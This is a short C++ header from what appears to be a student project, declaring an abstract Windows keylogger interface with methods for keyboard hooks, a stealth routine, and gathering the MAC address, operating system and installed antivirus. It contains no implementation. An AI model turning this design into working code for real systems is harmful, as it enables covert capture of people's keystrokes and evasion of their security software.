//
// IKeyLogger.hpp for cpp_spider in /mnt/c/Users/Public/Projets/Tek3/cpp_spider/includes
//
// Made by Jeremy Thoveron
// Login   <jeremy.thoveron-@epitech.net>
//
// Started on  Fri Sep 29 15:59:52 2017 Jeremy Thoveron
// Last update Fri Sep 29 16:20:10 2017 Jeremy Thoveron
//


#ifndef CPP_SPIDER_IKEYLOGGER_HPP
#define CPP_SPIDER_IKEYLOGGER_HPP

#include	<fstream>
#include	<iostream>
#include	<string>
#include	<windows.h>

class 		IKeyLogger
{
public:
  virtual bool 		checkUpper() = 0;
  virtual void		initHooks() = 0;
  virtual void		stealth() = 0;
  virtual void		unHooks() = 0;
  virtual void		getMacAddr() = 0;
  virtual void		getOperatingSystem() = 0;
  virtual void		getAntiVirus() = 0;
};


#endif //CPP_SPIDER_IKEYLOGGER_HPP
